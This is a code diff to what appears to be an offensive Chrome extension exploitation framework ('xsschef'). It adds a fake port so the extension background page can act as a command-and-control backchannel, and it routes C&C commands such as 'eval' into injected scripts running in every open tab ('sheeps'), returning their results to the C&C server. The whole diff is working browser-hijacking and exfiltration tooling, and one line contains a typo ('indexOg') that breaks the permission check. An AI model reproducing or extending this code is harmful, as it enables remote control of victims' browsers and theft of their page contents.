@@ -24,6 +24,8 @@ function __xsschef() {
         return;
     }
     window.__xsschef_init = true;
+    
+    var MY_TAB_ID = -1;
 
     // these scripts gets executed in sheepchannel tab context, they're written here only for syntax highlighting & easy editing
     // START scripts
@@ -52,7 +54,6 @@ function __xsschef() {
     
     var backchannel_script = function(__p) {
         var url = '__URL__';
-        
         if (url.match(/^http/)) { // http backchannel
 
             /* receive commands from ext and send the results to c&c */
@@ -88,6 +89,7 @@ function __xsschef() {
             function ReconnectingWebSocket(a,prot){function f(g){c=new WebSocket(a,prot);var h=c;var i=setTimeout(function(){e=true;h.close();e=false},b.timeoutInterval);c.onopen=function(c){clearTimeout(i);b.readyState=WebSocket.OPEN;g=false;b.onopen(c)};c.onclose=function(h){clearTimeout(i);c=null;if(d){b.readyState=WebSocket.CLOSED;b.onclose(h)}else{b.readyState=WebSocket.CONNECTING;if(!g&&!e){b.onclose(h)}setTimeout(function(){f(true)},b.reconnectInterval)}};c.onmessage=function(c){b.onmessage(c)};c.onerror=function(c){b.onerror(c)}}this.debug=false;this.reconnectInterval=1e3;this.timeoutInterval=2e3;var b=this;var c;var d=false;var e=false;this.url=a;this.prot=prot;this.readyState=WebSocket.CONNECTING;this.URL=a;this.onopen=function(a){};this.onclose=function(a){};this.onmessage=function(a){};this.onerror=function(a){};f(a);this.send=function(d){if(c){return c.send(d)}else{throw"INVALID_STATE_ERR : Pausing to reconnect websocket"}};this.close=function(){if(c){d=true;c.close()}};this.refresh=function(){if(c){c.close()}}};
         
             var ws = new ReconnectingWebSocket(url,'chef');
+
             /* receive commands from ext and send the results to c&c */
             __p.onMessage.addListener(function(msg) {
                 switch (msg.cmd) {
@@ -165,21 +167,16 @@ function __xsschef() {
             delete sheeps[tab.id];
         }    
     }
-
-    // setup listener from sheeps/backchannel
-    chrome.extension.onConnect.addListener(function(port) {
-        if (port.name == 'backchannel') {
-            backchannel = port;
-        } else if (port.name == 'sheepchannel') {
-            sheeps[port.tab.id].port = port;
-        }
-        
-        port.onMessage.addListener(function(msg) {
+    
+    function processCommands(msg, port) {
             switch (msg.cmd) {
-                case 'recvstuff':
-                case 'recveval':
+                // these commands come from sheeps
+                case 'recvstuff': // from sheeps
+                case 'recveval': // from sheeps
                     log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p});
                 break;
+                
+                // all below commands are from backchannel
                 case 'eval':
                     if (msg.id) { // eval in sheep
                         log('eval ' + msg.p + ' in sheep');
@@ -250,7 +247,17 @@ function __xsschef() {
                 break;
                 
             }
-        });
+        }
+
+    // setup listener from sheeps/backchannel
+    chrome.extension.onConnect.addListener(function(port) {
+        if (port.name == 'backchannel') {
+            backchannel = port;
+        } else if (port.name == 'sheepchannel') {
+            sheeps[port.tab.id].port = port;
+        }
+        
+        port.onMessage.addListener(function(msg) {processCommands(msg, port)});
     });
     
     // setup sheepchannel scripts in all tabs (sheeps)
@@ -258,12 +265,59 @@ function __xsschef() {
         for (var i=0; i<t2.length;i++) {
             addSheep(t2[i]);
         }
-    });    
+    });
+    
+    var FakePort = function(name, tab_id) {
+        var self = this;
+        
+        function _notify(msg, side) {
+            self[side].listeners.forEach(function(f) {
+                f.apply(self[side], [msg]);
+            });
+        }
+        
+        this.local = {
+            name: name,
+            tab: {id: tab_id, url: location.href },
+            listeners : [],
+            postMessage: function(msg) {
+                _notify(msg,'remote');
+            },
+            onMessage: {
+                addListener: function(f) {
+                    self.local.listeners.push(f);
+                }
+            }
+        };
+        
+        this.remote = {
+            name: name,
+            tab: {id: tab_id, url: location.href },
+            listeners : [],
+            postMessage: function(msg) {
+                _notify(msg,'local');
+            },
+            onMessage: {
+                addListener: function(f) {
+                    self.remote.listeners.push(f);
+                }
+            }
+        }
+        
+        return {
+            local: this.local,
+            remote: this.remote
+        }
+    };
 
     var setupBackchannel = function(tabId, oncomplete) {
-        if (tabId == -1) {
-            __p = chrome.extension.connect({name:"backchannel"});
-            backchannel_script(__p);
+        if (tabId == MY_TAB_ID) {
+            // fake port needs to be set up, chrome f*cks up allow port connections within the same window
+            var port = new FakePort('backchannel', MY_TAB_ID);
+            port.local.onMessage.addListener(function(msg) {processCommands(msg, port.local)});
+            backchannel = port.local;
+            backchannel_script(port.remote);
+            setTimeout(oncomplete, 500);
         } else {
             chrome.tabs.executeScript(tabId, 
                 {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});('+backchannel_script.toString()+')(__p);})();'}
@@ -272,14 +326,23 @@ function __xsschef() {
     }
     
     // todo: make ext the backchannel itself, if permissions allow
-    chrome.permissions.contains({
-      origins: ['http://*/*']
-    }, function(yes_i_can) {
+    chrome.permissions.getAll(function(perms) {
+        var yes_i_can = false;
         
-        if (false && yes_i_can) { // this does not for for now, don't know why
+        // cause chrome.permissions.contains suck and does not resolve <all_urls> into http://*/*
+        if (window === chrome.extension.getBackgroundPage()
+            && perms.origins
+            && (perms.origins.indexOf('<all_urls>') >= 0
+               || perms.origins.indexOg('http://*/*') >= 0)) {
+            
+            // extension can communicate directly from background page
+            yes_i_can = true;
+        }
+        
+        if (yes_i_can) { // this does not for for now, don't know why
             // extension has permissions for XHR on our C&C domain
             // and set a direct log function
-            setupBackchannel(-1, init_complete);
+            setupBackchannel(MY_TAB_ID, init_complete);
         } else {
             // proxy the requests to C&C through backchannel tab
             // setup backchannel port in first http/https tab
